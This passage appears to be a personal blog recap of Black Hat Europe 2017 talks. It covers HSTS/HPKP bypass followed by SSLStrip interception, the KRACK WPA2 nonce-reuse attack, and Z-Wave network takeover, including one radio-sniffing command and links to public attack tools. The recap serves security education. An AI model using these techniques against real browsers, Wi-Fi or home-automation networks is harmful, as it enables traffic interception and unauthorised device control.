To remember which site has HSTS and who is the owner of each certificate signature, Firefox uses a small text file (SiteSecurityServiceState.txt). In the Firefox source code, this plain text file can take 1024 entries maximum.

With **cloudspinning** researchers sent a lot of HSTS data to the target Firefox. When 1024 entries are exceeded, the original results in the plain text are erased.

Then the client will need to go to the 80 port again, and if you start SSLStrip at the right moment, you’re MITM is perfectly performed.

To playing with the **Score** columns, you can use the Delorean script (2).

#### Chrome

Chrome runs the same system as Firefox, but there is no limit on this text file. **Problem solved?** Not really…

Even if there is no limit, Chrome will store every result in the file. If you send a lot of requests, just as with Firefox during a couple of minutes, 10⁄15 or more, this file will become very huge (200⁄300 Mo).

Each request sent by Chrome is analyzed with this file to know if we can use HSTS or HPKP. Then Chrome is unusable at all, because browsing a 400 Mo file is slow! Then, you have to wipe all data.

The same thing as Firefox, SSLStrip will work now.

#### Internet Explorer/EDGE

IE/EDGE doesn’t use a simple text file, they use a database. Now, there is two important point here:

*   The lack of documentation
*   IE does not support HPKP

HSTS in IE/EDGE is managed by **WinInet.dll**.

Due to problems in the storage process, not all HSTS website is remembered. Then if you clear the cache, the user hasn’t a real HSTS protection.

**From a personal point of view**, before this briefing I just had a little idea of how HSTS and HPKP works. The presentation was very clear and interesting.

#### Source documents

1.  Sheila Ayelen Berta & Sergio De Los Santos, _Black hat presentation_, Thursday, December 7, 2017. [https://www.blackhat.com/docs/eu-17/materials/eu-17-Berta-Breaking-Out-HSTS-And-HPKP-On-Firefox-IE-Edge-And-Possibly-Chrome.pdf](https://www.blackhat.com/docs/eu-17/materials/eu-17-Berta-Breaking-Out-HSTS-And-HPKP-On-Firefox-IE-Edge-And-Possibly-Chrome.pdf)
2.  PentesterES, _\[GitHub\] Tools to bypass FF, Chrome and IE HSTS/HPKP protection_. [https://github.com/PentesterES/Delorean](https://github.com/PentesterES/Delorean)

### Key Reinstallation Attacks: Breaking the WPA2 Protocol

> Mathy Vanhoef from KU Leuven

In the WPA2 process, there are 3 step:

1.  Pairing step
2.  4-Way Handshake
3.  Group Key Handshake

The KRACK vulnerability is in the 4-Way Handshake. Here is a standard 4-Way Handshake:

![](/lib/images/articles/bheu2017/krack1.png)

*   PTK = PRF(PMK, ANonce, SNonce, MAC client, MAC point d’accès)
*   PRF: Hashing function based on HMAC using SHA1
*   PMK: hash(SSID + Access point key)
*   Packet Number (PN): Incremental counter initialized to 0 at the beginning of the 4-Way Handshake, used to generate PMK.

According to the _802.11r: FT - Fast Basic Service State Transition_

If the access point never receives the last transmission of the 4-Way Handshake, it has to resend first message (ANonce + Access point MAC) and third message (“I generated the PTK!”). Each third message received by the client, it has to update the PN counter with the one received by the access point.

If an attacker intercepts the fourth message, then the client will continue to communicate normally (encrypted communication), but after few moment the access point will timeout and resend 1st en 3rd transmission. According to the norms, the client will reinstall the PN counter.

WPA2 cipher broken. After that, it’s easy to decrypt the network flow. Because GCMP and TKIP allow injection and forge of the new packet, then you can forge known packet and send him to the access point or client and received the encrypted packet.

Then:

*   known\_clear\_packet XOR known\_encrypt\_packet = XOR\_KEY
*   unknown\_encrypted\_packet XOR XOR\_KEY = unknown\_clear\_packet

Interesting fact, the WPA\_Supplicant implement in Linux and Android will not reinstall the PTK with Access point PN counter after the fourth request. It will simply erase the PTK and replace it with 0.

[![krack presentation](https://img.youtube.com/vi/fZ1R9RliM1w/0.jpg)](https://www.youtube.com/watch?v=fZ1R9RliM1w)

**From a personal point of view**, I’m a bit frustrated by this presentation. He didn’t go very far technically, just presented his paper (available on the internet). Also, Mathy Vanhoef didn’t release his tool, maybe in the 34C3…

#### Source documents

1.  Mathy Vanhoef. _\[Paper\] Key Reinstallation Attack_, Thursday, December 7, 2017. [https://papers.mathyvanhoef.com/blackhat-eu2017.pdf](https://papers.mathyvanhoef.com/blackhat-eu2017.pdf).
2.  Mathy Vanhoef. _Krack Attack – Breaking WPA2 by forcing nonce reuse_, [https://www.krackattacks.com/](https://www.krackattacks.com/)
3.  Mathy Vanhoef, _\[GitHub\] Test equipment_. [https://github.com/vanhoefm/krackattacks-scripts](https://github.com/vanhoefm/krackattacks-scripts)
4.  Hackndo aka Pixis. _\[GitHub\] Krack PoC_, [https://github.com/Hackndo/krack-poc](https://github.com/Hackndo/krack-poc)
5.  Hackndo aka Pixis, _KRACK casser le WPA2_, [http://beta.hackndo.com/krack/](http://beta.hackndo.com/krack/)

### A Universal Controller to Take Over a Z-Wave Network

> Loïc ROUCH (speaker), Jérôme FRANÇOIS, Frédéric BECK from INRIA Nancy

There is two mode in Z-wave: unsecure & secure. _Loïc ROUCH_ explains how the _unsecure_ mode can be exploited to make a universal controller.

The target network looks to:

![](/lib/images/articles/bheu2017/zwave1.png)

The attacker will need:

*   Z-Wave controller
*   DVB-T tuner

There is a **HomeID**/**NodeID** for the master and only **NodeID** for the slave. During association and pairing, the master will send his HomeID to the slave.

Then, the attack is based on the HomeID. You have to get it and replay it to control all associated slaves.

The DVB-T Tuner is necessary to get the HomeID (3):

    rtl_sdr -f 868420000 -s 2000000 -g 25 - | ./wave-in -u
    

First fourth bytes are the HomeID.

Through the Backup and restore function, they restore the stolen HomeID.

But, impersonate the new HomeID doesn’t mean that you have the control of all slave. Not yet.

With the Z-Wave controller, you just have to scan the Network and slaves will connect to you.

**From a personal point of view** it was a cool presentation, unfortunately, the demonstration didn’t work. Maybe I’ll try to reproduce this later :-)

#### Source documents

1.  Loïc ROUCH, Jérôme FRANÇOIS & Frédéric BECK, _\[Paper\] A Universal Controller to Take Over a Z-Wave Network_, Thursday, December 7, 2017. [https://www.blackhat.com/docs/eu-17/materials/eu-17-Rouch-A-Universal-Controller-To-Take-Over-A-Z-Wave-Network-wp.pdf](https://www.blackhat.com/docs/eu-17/materials/eu-17-Rouch-A-Universal-Controller-To-Take-Over-A-Z-Wave-Network-wp.pdf)
2.  Loïc ROUCH, Jérôme FRANÇOIS & Frédéric BECK, _Black hat presentation_, Thursday, December 7, 2017. [https://www.blackhat.com/docs/eu-17/materials/eu-17-Rouch-A-Universal-Controller-To-Take-Over-A-Z-Wave-Network.pdf](https://www.blackhat.com/docs/eu-17/materials/eu-17-Rouch-A-Universal-Controller-To-Take-Over-A-Z-Wave-Network.pdf)
3.  Baol, _\[GitHub\] Waving-Z_. [https://github.com/baol/waving-z](https://github.com/baol/waving-z)

### Goodies hunting part 2

With [@razaborg](https://twitter.com/razaborg) again, we wanted to try the **NCC Group** challenge.

This challenge was in 2 parts, first, we started with a commercial invoice and a QR Code. After that, NCC Group employee gave us an NFC card.

First step:

*   Decoding QR code
*   Decoding Base64
*   Replacing data with right information (found in commercial invoice)
*   Re-encoding in Base64
*   Re-generating the QR Code

Second step:

*   Scan NFC card
*   Bunch of data -> Dcode helps us, it was Caesar shift 10
*   Replacing with right data (according to the commercial invoice again)
*   Re-generation of an MD5 hash -> we had to “brute-force” it.
*   Re-shifting
*   Flashing the NFC card

w00t \\o/

Here is a picture of my loot:

![](/lib/images/articles/bheu2017/loot.jpg)

Others briefing
---------------

Arsenal
-------

The Arsenal was little presentation stand and people introduced their tools.

All tools are available on that GitHub: [https://github.com/toolswatch/blackhat-arsenal-tools](https://github.com/toolswatch/blackhat-arsenal-tools)

**From a personal point of view** Arsenal is really great to make known people, I think I will try in BH 2018 with _Auto-Vol_! :-D

Conclusion
----------

I think it’s my best event at this time! Briefings were crazy, arsenal tools were crazy too and there was a lot of goodies!

I also met nice people, such as:

*   [@PaulWebSec](https://twitter.com/PaulWebSec)
*   [@lyon01\_david](https://twitter.com/lyon01_david)
*   [@\_Bytemare](https://twitter.com/_Bytemare)
*   [@_SaxX_](https://twitter.com/_SaxX_)

Feel free to contact me on Twitter or by email! See you soon :-D

Thanks to Nicolas TERRIEN for his english skills! :D
